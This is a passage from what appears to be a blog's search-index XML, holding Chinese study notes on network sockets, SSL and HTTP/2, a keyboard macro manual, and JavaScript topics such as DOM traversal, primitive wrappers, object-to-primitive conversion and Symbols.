`。调用 `speedy.eat` 方法时，改动的也是 `stomach 属性 `。因此，所有的仓鼠共享了同一个胃！</code></pre>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应用层</title>
      <link href="2021/08/06/ying-yong-ceng/"/>
      <url>2021/08/06/ying-yong-ceng/</url>
      
        <content type="html"><![CDATA[<p>应用层通过套接字使用传输层的服务。</p><a id="more"></a><h1 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h1><p>网络中两个应用程序的通信实际上是进程之间的通信。</p><ol><li>进程通过一个称为 ** 套接字 socket** 的软件接口向网络发送报文或者从网络接收报文。</li><li>进程比作房子，套接字就是房门。一个进程与另一进程通信，把报文推出门，通过有运输功能的设施把报文传送到目的进程的门口，然后目的主机的进程通过进程的门（套接字）处理报文。</li></ol><p>套接字就是应用程序（进程）和运输层协议之间的接口。</p><blockquote><p>应用程序开发者可以控制套接字在应用层端的一切，但是开发者对该套接字的运输端几乎没有控制权。</p></blockquote><h1 id="安全套接字层"><a href="#安全套接字层" class="headerlink" title="安全套接字层"></a>安全套接字层</h1><p>SSL，不是与 TCP 和 UDP 同一层次的第三种运输协议，只是对 TCP 的加强，强化是在应用层上实现的。<br>例如，一个应用程序要使用 SSL 服务时，需要在应用程序的客户端 &amp; 服务器端同时使用 SSL 代码。<br>SSL 有专门的套接字：</p><ol><li>发送报文的进程首先向 SSL 套接字传递明文数据</li><li>然后 SSL 代码加密数据，并将加密后的数据传递给 *<em>TCP 套接字 *</em>，发送到因特网</li><li>经过因特网后到达目的主机接收进程使用的 *<em>TCP 套接字 *</em></li><li>该套接字再将加密数据传递给 SSL 解密</li><li>最后，SSL 将解密后的数据通过 SSL 套接字传递给接收进程</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应用层 - 网络</title>
      <link href="2021/08/06/ying-yong-ceng-wang-luo/"/>
      <url>2021/08/06/ying-yong-ceng-wang-luo/</url>
      
        <content type="html"><![CDATA[<p>应用层通过套接字使用传输层的服务。</p><a id="more"></a><blockquote><p>笔记：《计算机网络 - 自顶向下（第七版）》</p></blockquote><h1 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h1><p>网络中两个应用程序的通信实际上是进程之间的通信。</p><ol><li>进程通过一个称为 ** 套接字 socket** 的软件接口向网络发送报文或者从网络接收报文。</li><li>进程比作房子，套接字就是房门。一个进程与另一进程通信，把报文推出门，通过有运输功能的设施把报文传送到目的进程的门口，然后目的主机的进程通过进程的门（套接字）处理报文。</li></ol><p>套接字就是应用程序（进程）和运输层协议之间的接口。</p><blockquote><p>应用程序开发者可以控制套接字在应用层端的一切，但是开发者对该套接字的运输端几乎没有控制权。</p></blockquote><h1 id="安全套接字层"><a href="#安全套接字层" class="headerlink" title="安全套接字层"></a>安全套接字层</h1><p>SSL，不是与 TCP 和 UDP 同一层次的第三种运输协议，只是对 TCP 的加强，强化是在应用层上实现的。<br>例如，一个应用程序要使用 SSL 服务时，需要在应用程序的客户端 &amp; 服务器端同时使用 SSL 代码。<br>SSL 有专门的套接字：</p><ol><li>发送报文的进程首先向 SSL 套接字传递明文数据</li><li>然后 SSL 代码加密数据，并将加密后的数据传递给 *<em>TCP 套接字 *</em>，发送到因特网</li><li>经过因特网后到达目的主机接收进程使用的 *<em>TCP 套接字 *</em></li><li>该套接字再将加密数据传递给 SSL 解密</li><li>最后，SSL 将解密后的数据通过 SSL 套接字传递给接收进程</li></ol><h1 id="HTTP-Web-应用层协议"><a href="#HTTP-Web-应用层协议" class="headerlink" title="HTTP-Web 应用层协议"></a>HTTP-Web 应用层协议</h1><p>HTTP 客户端首先发起一个与服务器的 TCP 连接。<br>一旦连接建立，此客户端（浏览器）和服务器进程就可以通过各自的套接字访问 TCP。<br>如第一节套接字所述</p><ol><li>客户端向自己的套接字接口发送 HTTP 请求报文，接收 HTTP 响应报文。</li><li>一旦向套接字发送了请求报文，该报文就完全脱离了客户端（浏览器）的控制，套接字将报文交由 TCP 控制。TCP 的可靠数据传输服务保证了这个请求报文可以完整地到达服务器。</li><li>服务器端也是如此</li></ol><h2 id="是否复用-TCP-连接：持续与非持续连接"><a href="#是否复用-TCP-连接：持续与非持续连接" class="headerlink" title="是否复用 TCP 连接：持续与非持续连接"></a>是否复用 TCP 连接：持续与非持续连接</h2><p>客户端和服务器端可能需要长时间通信，通信的请求需要一个一个的发送，应用程序的开发者需要决定在这个客户端与服务器的通信中：</p><ul><li>非持续连接：每个请求与响应使用单独的 TCP</li><li>持续连接：或者全部请求响应经过相同的 TCP</li></ul><p>非持续连接：<br>例如，一个包含 3 个图片的 HTML 网页文档。</p><ol><li>服务器是一直开着的，客户端要首先和服务器简历 TCP 连接</li><li>接着，客户端发送请求获得网页</li><li>HTTP 服务器进程收到请求，封装网页发送给 TCP 套接字</li><li>发送完成后，HTTP 服务器进程会通知 TCP 断开此 TCP 连接（其实直到 TCP 确认客户端已经完整收到响应报文，它才会真正断开连接）。</li><li>客户端收到包含网页的报文后，与服务器的 TCP 连接就被关闭</li><li>之后的 3 张图片的请求需要重复 3 次这个过程。</li></ol><blockquote><p>一句话，每个 TCP 连接只传输一个请求报文和一个响应报文。</p></blockquote><p>非持续连接缺点是：</p><ol><li>Web 服务器负担大。由于 TCP 连接太多，而每个 TCP 连接都需要缓冲区和变量进行维护连接，所以给 Web 服务器很大压力。</li><li>不必要的时延。因为建立 TCP 连接时，总需要一个 RTT 来创建 TCP，其后的一个 RTT 才是请求和接收 Web 数据。</li></ol><p>持续连接：服务器在发送响应后，不会马上断开 TCP 连接，在后续同一客户端发送请求时，继续通过这个 TCP 连接进行传输。一般经过一定的时间未使用后，HTTP 才会关闭 TCP 连接。</p><h3 id="往返时间：RTT"><a href="#往返时间：RTT" class="headerlink" title="往返时间：RTT"></a>往返时间：RTT</h3><p>代表一个短分组从客户端到服务器端然后再返回客户端的时间。<br>一般三次握手的前两次所耗费的时间可以视为一个 <code>RTT</code>。<br>客户端通常结合第三次握手，向该 TCP 连接发送一个 HTML 请求报文。一旦此请求报文到达服务器，服务器就在这个建立好的 TCP 连接上发送 HTML 文件。第三次握手和 HTML 响应报文到达客户端的事件就是另一个 <code>RTT</code>。</p><p><img src="/images/post-images/1628217107434.png" alt="">、</p><h2 id="HTTP2"><a href="#HTTP2" class="headerlink" title="HTTP2"></a>HTTP2</h2><p><a href="https://www.imyangyong.com/blog/2019/05/javascript/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B5%81/" target="_blank" rel="noopener">二进制流</a><br>二进制的优势：</p><ol><li>文本数据，与字符流无差别。而对于数字，二进制更节省空间。</li><li>图片和视频在存储时，是二进制的，使用时，转换为二进制流也更快捷。</li></ol><p>HTTP2 相比之前的 1.X 版本，优点：</p><ol><li>完全的二进制格式的数据传输，而 1.X 默认为文本格式。一般来说，相同的内容量，二进制流比文本流使用更少的字节既可以实现传输。</li><li>版本 2 使用 <strong>TCP 多路复用 ** 来降低网络请求连接建立和关闭的开销，多个请求可以通过一个 TCP 连接 ** 并行完成 *<em>。多路复用是传输层完成的，而 1.X 的 keep-alive 是在应用层的连接复用，而且是 *</em> 串行的 **，就是说，一个文件通过这个 TCP 连接传输完成后，下个文件才能开始复用这个连接。</strong>TCP 多路复用 ** 可以让不同文件的传输帧在一个 TCP 连接中一起同时进行流式传输。</li><li>版本 2 支持传输流的优先级和流量控制机制。例如，服务器可以直接设置，HTML 和 CSS 优先级高，而 JS 脚本优先级低，这样 JS 就可以不用写在 HTML 底部了。</li><li>支持服务器推送。服务器主动把资源推送给客户端。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>键盘说明书</title>
      <link href="2021/08/05/jian-pan-shuo-ming-shu/"/>
      <url>2021/08/05/jian-pan-shuo-ming-shu/</url>
      
        <content type="html"><![CDATA[<ul><li>锁 win 键：<code>Fn+Win</code> 长按 3 秒</li><li>恢复出厂：<code>左 Win</code>+<code>右 Win</code> 长按 3 秒  </li></ul><p>宏定义：</p><ul><li>设置宏定义按键，需要先进入宏定义层</li><li>进入宏定义需要先进入自定义层，自定义层内可以使用定义好的宏定义按键</li><li><code>Fn + 左 Win</code> 长按 3 秒进入自定义层</li><li>再按 <code>Fn+Esc</code> 进入宏定义层</li><li>按 <code>Fn+a</code> 键就可以定义 a 键触发的宏（除了 win 和 fn 外，其他按键都能设置宏）</li><li>定义完宏后，按 <code>Fn+Esc</code> 退出宏定义层，就进入了自定义层，此时按 a 键就可以使用刚才的宏了</li><li><code>Fn + 左 Win</code> 长按 3 秒退出自定义层</li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>遍历 DOM</title>
      <link href="2021/08/05/bian-li-dom/"/>
      <url>2021/08/05/bian-li-dom/</url>
      
        <content type="html"><![CDATA[<p>对 DOM 的所有操作都是以 document 对象开始</p><a id="more"></a><p><img src="/images/post-images/1628150581000.png" alt=""></p><p>DOM 树最顶层的节点可以直接作为 document 属性使用。<br>例如：<code>document.documentElement =&gt; html 节点</code> 就是 document 中最顶层的 DOm 节点，对应 <code>&lt;html&gt;</code> 标签这个 DOM 节点。<br>还有 <code>document.body =&gt; body 节点</code>，<code>document.head =&gt; head 节点</code>。</p><blockquote><p>由于脚本执行位置可能是在 body 之前，所以 <code>document.body</code> 可能是 null。</p></blockquote><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;script&gt;            alert( &quot;From HEAD:&quot; + document.body ); // null，这里目前还没有 &lt;body&gt;        &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;        alert( &quot;From BODY:&quot; + document.body ); // HTMLBodyElement，现在存在了        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;子</code></pre><h1 id="DOM-集合"><a href="#DOM-集合" class="headerlink" title="DOM 集合"></a>DOM 集合</h1><blockquote><p>这 3 个方法获得的 DOm 节点对象都是只读的。</p></blockquote><p><code>childNodes</code> 集合包含了所有子节点，包括文本节点。并不是数组实例对象。有 length 属性。只是一个类数组的可迭代对象。<br><code>firstChild 和 lastChild</code> 属性是访问第一个和最后一个子元素的快捷方式。<br><code>elem.hasChildNodes()</code> 用于检查节点是否有子节点</p><blockquote><p>*<em>DOM 集合是实时的 *</em>：在通过这些方法获得 DOM 对象后，即使后面 DOM 对象被更新，这些节点的更新自动反应到集合中。</p></blockquote><h1 id="兄弟节点和父节点"><a href="#兄弟节点和父节点" class="headerlink" title="兄弟节点和父节点"></a>兄弟节点和父节点</h1><ul><li><code>节点对象. nextSibling</code> 指向右边的兄弟节点</li><li><code>节点对象. previousSibling</code> 指向左边的兄弟节点</li><li><code>节点对象. parentNode</code> 指向父节点</li></ul><h1 id="只要元素节点"><a href="#只要元素节点" class="headerlink" title="只要元素节点"></a>只要元素节点</h1><p>在 childNodes 中我们可以看到文本节点，元素节点，甚至如果注释节点存在的话，也能访问到。总之就是各种节点都被囊括在内。<br>但是对于很多任务来说，我们并不想要文本节点或注释节点。我们希望操纵的是代表标签的和形成页面结构的 ** 元素（Element）节点 **。</p><p><img src="/images/post-images/1628155164899.png" alt=""></p><p>和上面的图类似，就是加了 <code>Element</code></p><ul><li><code>children</code> — 仅那些作为元素节点的子代的节点。</li><li><code>firstElementChild ， lastElementChild</code> — 第一个和最后一个子元素。</li><li><code>previousElementSibling ， nextElementSibling</code> — 兄弟元素。</li><li><code>parentElement</code> — 父元素</li></ul><blockquote><p><code>parentElement 与 parentNode</code> 的区别：一般是一样的。区别是在 <code>html</code> 节点上。<br>html 节点的父节点是 document<br>html 节点的父元素节点是是 null</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DOM 树</title>
      <link href="2021/08/05/dom-shu/"/>
      <url>2021/08/05/dom-shu/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>在 DOM 中：</p><ul><li>每个 HTML 标签都是一个对象</li><li>嵌套的标签是子标签</li><li>标签内文本也是一个对象</li><li>以上对象都可以通过 JS 访问</li></ul><h1 id="DOM-树的例子"><a href="#DOM-树的例子" class="headerlink" title="DOM 树的例子"></a>DOM 树的例子</h1><pre><code class="html">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;About elk&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    The truth about elk.&lt;/body&gt;&lt;/html&gt;</code></pre><p>DOM 将 HTML 表示为标签的树形结构<br><img src="/images/post-images/1628147300738.png" alt=""></p><ul><li>标签叫做 ** 元素节点 **</li><li>元素内的文本叫做 ** 文本节点 **，图中标记为 <code>#text</code>。一个文本节点只包含一个字符串，文本节点总是 DOM 树的叶子，即没有子项。</li><li>空格和换行符都是完全有效的字符，和字母数字地位相同。</li></ul><blockquote><p>由于历史原因，head 标签前后的换行与空格均被忽略。<br><code>&lt;/body&gt;</code> 之后不能有也不会有空格，因为 body 后的东西自动被移动到 body 内。</p></blockquote><p>去掉空格：</p><pre><code class="html">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;About elk&lt;/title&gt;&lt;/head&gt;&lt;body&gt;The truth about elk.&lt;/body&gt;&lt;/html&gt;</code></pre><p>此时的 DOM 树为：<br><img src="/images/post-images/1628147626394.png" alt=""></p><h1 id="自动修正"><a href="#自动修正" class="headerlink" title="自动修正"></a>自动修正</h1><p>如果浏览器遇到格式不正确的 HTML，它会在形成 DOM 时自动更正它。<br>例如，顶级标签总是 <code>&lt;html&gt;</code> 。即使它不存在于文档中 — 它也会出现在 DOM 中，因为浏览器会创建它。对于 <code>&lt;body&gt;</code> 也是一样。<br>例如，如果一个 HTML 文件中只有一个单词 “Hello”，浏览器则会把它包装到 <code>&lt;html&gt;</code> 和 <code>&lt;body&gt;</code> 中，并且会添加所需的 <code>&lt;head&gt;</code></p><p>在生成 DOM 时，浏览器会自动处理文档中的错误，关闭标签等</p><blockquote><p>表格永远有 <code>&lt;tbody&gt;</code></p></blockquote><h1 id="浏览器控制台"><a href="#浏览器控制台" class="headerlink" title="浏览器控制台"></a>浏览器控制台</h1><p>在元素选项中用鼠标选择一个元素后，<br>在控制台：最后选中的元素可以通过 <code>$0</code> 来进行操作，先前选择的是 <code>$1</code></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字类型 - 深入数据类型</title>
      <link href="2021/08/05/shu-zi-lei-xing-shen-ru-shu-ju-lei-xing/"/>
      <url>2021/08/05/shu-zi-lei-xing-shen-ru-shu-ju-lei-xing/</url>
      
        <content type="html"><![CDATA[<p>两种：IEEE754 的 64 位双精度浮点数 &amp; BigInt</p><a id="more"></a><h1 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h1><ul><li>二进制，<code>0b,0B</code> 打头</li><li>八进制，<code>0o,0O</code> 或者 <code>0</code> 打头</li><li>十六进制, <code>0x,0X</code> 打头</li></ul><h1 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h1><p>使用 <code>变量. toString(目标进制)</code> 可以进行进制转换。</p><ul><li>默认值：10</li><li>最小值：2</li><li>最大值：36（0-9 加上 A-Z）</li></ul><blockquote><p>使用两个点来调用一个方法<br>使用数值字面量调用方法时，使用两个 <code>.</code> 或者加上括号。<code>256..toString(16) =&gt; &quot;100&quot;</code></p></blockquote><h1 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h1>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原始类型的方法 - 深入数据类型</title>
      <link href="2021/08/05/yuan-shi-lei-xing-de-fang-fa-shen-ru-shu-ju-lei-xing/"/>
      <url>2021/08/05/yuan-shi-lei-xing-de-fang-fa-shen-ru-shu-ju-lei-xing/</url>
      
        <content type="html"><![CDATA[<p>JavaScript 允许我们像使用对象一样使用原始类型（字符串，数字等）。<br>虽然对象相比原始类型，可以用上方法这个很好的东西，但是对象比原始类型 “更重”，它们需要额外的资源来支持运作。</p><h1 id="当作对象的原始类型"><a href="#当作对象的原始类型" class="headerlink" title="当作对象的原始类型"></a>当作对象的原始类型</h1><p>以下是 JavaScript 创建者面临的悖论：</p><ul><li>人们可能想对诸如字符串或数字之类的原始类型执行很多操作。最好将它们作为方法来访问。</li><li>原始类型必须尽可能的简单轻量。</li></ul><p>于是，创建者提出了以下解决方法：</p><ol><li>原始类型还是原始类型。只是单个值，没有方法等属性。</li><li>JavaScript 允许直接像对象那样，直接访问字符串，数字，布尔值和 symbol 的方法和属性。</li><li>为了使上一条生效，需要 JS 引擎创建提供额外功能的特殊的 “对象包装器”，** 使用后即销毁 **。</li></ol><p>当然，每种原始类型的包装器都是不同的。String，Number，Boolean 和 Symbol。<br>例如，<code>str.toUpperCase()</code> 返回一个大写的 <code>str</code></p><pre><code class="javascript">let str = &quot;world&quot;;str.toUpperCase(); // &quot;WORLD&quot;</code></pre><ol><li>访问原始值的属性时，会创建一个包含字符串字面值的特殊对象，并且具有有用的方法，例如 toUpperCase()</li><li>执行方法</li><li>特殊对象被销毁，原始值保留</li></ol><blockquote><p>JavaScript 引擎高度优化了这个过程。它甚至可能跳过创建额外的对象。但是它仍然必须遵守规<br>范，并且表现得好像它创建了一样。</p></blockquote><h1 id="包装器的创建"><a href="#包装器的创建" class="headerlink" title="包装器的创建"></a>包装器的创建</h1><p>在 JavaScript 中，由于历史原因，<code>new Number(9), new String(&quot;sss&quot;)</code> 是可以的，但极其 ** 不推荐 **</p><p>因为变成了对象，会造成意外的：</p><ol><li>类型判断出错，</li><li>布尔值判断出错</li></ol><h1 id="null-undefined-没有任何方法"><a href="#null-undefined-没有任何方法" class="headerlink" title="null/undefined 没有任何方法"></a>null/undefined 没有任何方法</h1><p>它们没有对应的 “对象包装器”，也没有提供任何方法。从某种意义上说，它们是 “最原始的”。</p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="为原始类型添加属性"><a href="#为原始类型添加属性" class="headerlink" title="为原始类型添加属性"></a>为原始类型添加属性</h2><pre><code class="javascript">&gt; let str = &#39;w&#39;;&gt; str.test = 4&gt; str.testundefined&gt; let num = 8;&gt; num[&#39;test&#39;] = &#39;fff&#39;;&gt; num[&#39;test&#39;]undefined</code></pre><p>这个例子清楚地表明，原始类型不是对象。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>现代 JavaScript 教程 - javascript.info</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对象 - 原始类型转换 - Object 基础</title>
      <link href="2021/08/03/dui-xiang-yuan-shi-lei-xing-zhuan-huan-object-ji-chu/"/>
      <url>2021/08/03/dui-xiang-yuan-shi-lei-xing-zhuan-huan-object-ji-chu/</url>
      
        <content type="html"><![CDATA[<p>本文需要先了解 Symbol</p><a id="more"></a><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ol><li>所有对象在布尔上下文中均为 true。所以，对象不存在布尔值转换问题。只有字符串和数值转换。</li><li>数值转换：对象相减 <code>-</code> 或者应用数学函数时。例如两个 Date 对象相减。</li><li>字符串转换，发生在期望需要字符串的上下文时，例如 alert 函数。</li></ol><h1 id="转换变体"><a href="#转换变体" class="headerlink" title="转换变体"></a>转换变体</h1><p>在转换时，<strong>hint</strong> 用来指代具体哪种原始值的上下文。<br>下面是三个类型转换的变体，<strong>hint</strong> 值分别为：</p><ul><li><code>&quot;string&quot;</code>。对象到字符串的转换，当我们对期望一个字符串的对象执行操作时. 例如 alert 方法</li><li><code>&quot;number&quot;</code>。对象到数字的转换，例如进行数学运算（** 二元加法除外 **）时。</li><li><code>&quot;default&quot;</code>。只在少数情况下发生。当不能仅仅由运算符确定期望的类型时。例如，二原加运算符在有字符串参与运算时，可以连接字符串，在数学运算时，可以执行加法。此时 hint 就是 default。还有一种情况是，对象使用 <code>==</code> 与字符串，数字，或者 symbol 比较时。也是用 default 的 hint。</li></ul><blockquote><p>大于，小于虽然也算不确定情况（既可以比较字符串也可以比较数字），但是由于历史原因，对象参与这两个运算时的 hint 是 “number”。</p></blockquote><h1 id="三个对象方法"><a href="#三个对象方法" class="headerlink" title="三个对象方法"></a>三个对象方法</h1><p>上面说的 <strong>hint</strong> 还要看对象有没有对应的方法：</p><ol><li>若存在 <code>实例对象[Symbol.toPrimitive](hint)</code> 方法，则根据上面的描述决定传入的 hint 是 <code>&quot;string&quot;, &quot;number&quot; 还是 &quot;default&quot;</code></li><li>不存在上面的 1 的方法，且 hint 是 <code>&quot;string&quot;</code>，则尝试 <code>实例对象. toString()</code> 和 <code>实例对象. valueOf()</code></li><li>不存在上面的 1 的方法，且 hint 是 <code>number 或者 default</code>，尝试 <code>实例对象. valueOf()</code> 和 <code>实例对象. toString()</code></li></ol><h1 id="Symbol-toPrimitive"><a href="#Symbol-toPrimitive" class="headerlink" title="Symbol.toPrimitive"></a>Symbol.toPrimitive</h1><p>此内建 symbol 用来给 ** 转换方法 ** 命名：</p><pre><code class="javascript">let obj = {age:999,name:&#39;路由器&#39;};obj + 10; =&gt;&#39;[object Object]10&#39;obj[Symbol.toPrimitive] = function(hint) {    console.log(hint);    return hint === &#39;string&#39; ? this.name : this.age;}obj + 10; =&gt; hint：numberobj + &quot;10&quot;; =&gt; hint：default+obj; =&gt; hint：defaultobj &gt; 9; =&gt; hint：numberobj &lt;= 1000; =&gt; hint：number</code></pre><p>可以看出，<code>obj[Symbol.toPrimitive]</code> 根据转换的上下文的不同，obj 可以是字符串，也可以是数值。而且一般做法是将 <code>default 和 number</code> 视作同一个情况。</p><blockquote><p>此 <code>Symbol.toPrimitive</code> 方法必须返回原始值（<code>number, string,boolean,null, undefined</code>），否则在进行类型转换时会报错！！！</p></blockquote><h1 id="toString-amp-valueOf"><a href="#toString-amp-valueOf" class="headerlink" title="toString&amp;valueOf"></a>toString&amp;valueOf</h1><p>还没有 symbol 的时候就有了这两个方法，用来实现转换。<br>就像上面说的，没有 <code>Symbol.toPrimitive</code> 时，JavaScript 尝试使用这两个方法。</p><p>顺序是：</p><ul><li>对于 <code>&quot;string&quot;</code> 的 <code>hint</code>，toString 优先于 valueOf</li><li>其他情况，valueOf 优先于 toString</li></ul><p>默认情况下，普通对象具有 <code>toString</code> 和 <code>valueOf</code> 方法：</p><ul><li><code>toString</code> 方法默认返回一个字符串 “[object Object]”</li><li><code>valueOf</code> 方法默认返回对象本身</li></ul><p>测试执行顺序：</p><pre><code class="javascript">let obj = {    toString() {        return &quot;2&quot;;    }};obj * 4 =&gt; 8</code></pre><p>这是 number 上下文，首先寻找 valueOf 找不到，toString 找到了，就回去执行 toString，得到字符串，然后尝试 string 到 number 转换。</p><p>在期望需要字符串的上下文时：</p><pre><code class="javascript">let user = {name: &quot;John&quot;};alert(user); // [object Object]alert(user.valueOf() === user); // true</code></pre><p>所以，如果我们尝试将一个对象当做字符串来使用，例如在 alert 中，那么在默认情况下我们会<br>看到 <code>[object Object]</code> 。</p><p>自己实现这两个方法时，需要注意：</p><blockquote><p> 必须返回原始值，否则对象在需要进行类型转换时，你的非原始类型的返回值变得毫无意义。</p></blockquote><p>现在，实现一个同前面的 <code>obj[Symbol.toPrimitive]</code> 一样功能的方法:</p><pre><code class="javascript">let obj2 = {    age: 666,    desp: &#39;描述&#39;,}obj2.toString = function () {    return this.desp;}obj2.valueOf = function () {    return this.age;}</code></pre><h1 id="多重转换"><a href="#多重转换" class="headerlink" title="多重转换"></a>多重转换</h1><ol><li>对象被转换为原始值（通过前面我们描述的规则）。</li><li>如果生成的原始值的类型不正确，则继续进行转换。</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通常对于内建对象， “default” hint 的处理方式与 “number” 相同，因此在实践中，最后两个 hint 常常合并在一起。<br>转换算法：</p><ol><li>调用 <code>obj[Symbol.toPrimitive](hint)</code> 如果这个方法存在，</li><li>否则，如果 hint 是 “string”<ol><li>先尝试 <code>obj.toString()</code>，如果 toString 的返回值为原始类型，则得到此值就此结束，如果返回值为其他类型，则返回对象本身。</li><li>没有 <code>obj.toString()</code> 则去调用 valueOf, 如果 valueOf 的返回值为原始类型，则得到此值就此结束，如果返回值为其他类型，则返回对象本身</li></ol></li><li>否则，如果 hint 是 number，则先尝试 valueOf，再尝试 toString。</li></ol><p>在实践中，为了便于进行日志记录或调试，对于所有能够返回一种 “可读性好” 的对象的表达形式的<br>转换，只实现以 obj.toString() 作为全能转换的方法就够了</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Symbol 类型</title>
      <link href="2021/08/03/symbol-lei-xing/"/>
      <url>2021/08/03/symbol-lei-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="Symbol-概述"><a href="#Symbol-概述" class="headerlink" title="Symbol 概述"></a>Symbol 概述</h1><p>Symbol 值表示唯一的标识符。<br>创建时，不需要 new，可以指定描述作为 Symbol 名。</p><pre><code class="javascript">let id = Symbol(&quot;idHere&quot;);</code></pre><p>每个存在的 Symbol 都是互不相同的，即使 Symbol 名相同。因为 Symbol 名只是一个标签。</p><pre><code class="javascript">let s1 = Symbol(&quot;路由器&quot;);let s2 = Symbol(&quot;路由器&quot;);s1 == s2; // false</code></pre><p>Symbol 不会被自动转换为其他基本类型的值。如果想要转为 string，需要显示调用 <code>symbol.toString()</code> 或者 <code>symbol.description</code> 属性获取 Symbol 实例的 Symbol 名。</p><h1 id="Symbol-作为隐藏的属性"><a href="#Symbol-作为隐藏的属性" class="headerlink" title="Symbol 作为隐藏的属性"></a>Symbol 作为隐藏的属性</h1><p>Symbol 作为对象的属性名时，一般的访问对象属性的代码看不到这个属性。<br>利用这个特点，可以将一些值绑定在你无法完全控制的对象上，例如第三方的对象上。第三方的代码根本不会看到这个属性。</p><pre><code class="javascript">// 假设 user 为第三方代码创建的对象let id = Symbol(&#39;id&#39;);user[id] = &quot;12334&quot;;</code></pre><p>Symbol 属性会在 <code>for...in</code> 循环和 <code>Object.keys()</code> 中跳过</p><pre><code class="javascript"> let obj = {... age: 99,... action: function() {},... [id]: 2021,... }for (let k in obj) { console.log(k) }Object.keys(obj)</code></pre><p>输出 <code>age action</code> 和 <code>[ &#39;age&#39;, &#39;action&#39; ]</code>，并没有 Symbol。</p><p>克隆对象时，<code>Object.assign</code>** 可以看到 ** 并复制 Symbol 属性。</p><pre><code class="javascript">let b = Object.assign({},obj);b // { age: 99, action: [Function: action], [Symbol(id)]: 2021 }</code></pre><h1 id="全局-Symbol"><a href="#全局-Symbol" class="headerlink" title="全局 Symbol"></a>全局 Symbol</h1><p>虽然创建出来的 Symbol 互不相同，但是，可以使用全局 Symbol 注册表，维护 Symbol 实例，保证使用同一个 <code>key</code> 获得的 Symbol 都是相同的。</p><p>注册表内的 Symbol 就是全局 Symbol，可以在所在应用的代码中随处访问。</p><h2 id="Symbol-for-key"><a href="#Symbol-for-key" class="headerlink" title="Symbol.for(key)"></a>Symbol.for(key)</h2><p><code>Symbol.for(key)</code> 可以从全局 Symbol 注册表中读取返回（不存在则新建）一个 Symbol。</p><pre><code class="javascript">let id = &#39;id-123&#39;;let user = {    [Symbol.for(id)]: &quot;我是 ID&quot;,}user[Symbol.for(id)]; // &quot;我是 ID&quot;</code></pre><h2 id="Symbol-keyFor-sumbol"><a href="#Symbol-keyFor-sumbol" class="headerlink" title="Symbol.keyFor(sumbol)"></a>Symbol.keyFor(sumbol)</h2><p>由 Symbol 注册表的 symbol 实例其 symbol 名</p><pre><code class="javascript">Symbol.keyFor(Symbol.for(id)); // &#39;id-123&#39;</code></pre><p>如果没有在全局注册表中，则返回 undefined</p><pre><code>let localSymbol = Symbol(&#39;id-0&#39;);Symbol.keyFor(localSymbol); // undefined</code></pre><h2 id="内置-Symbol"><a href="#内置-Symbol" class="headerlink" title="内置 Symbol"></a>内置 Symbol</h2><p>JavaScript 内部有很多 “系统” Symbol，我们可以使用它们来微调对象的各个方面。<br>这里不表。<br><code>Symbol.for(&quot;Symbol.asyncIterator&quot;); =&gt; Symbol(Symbol.asyncIterator)</code></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对象引用和复制 - Object 基础</title>
      <link href="2021/08/02/dui-xiang-yin-yong-he-fu-zhi/"/>
      <url>2021/08/02/dui-xiang-yin-yong-he-fu-zhi/</url>
      
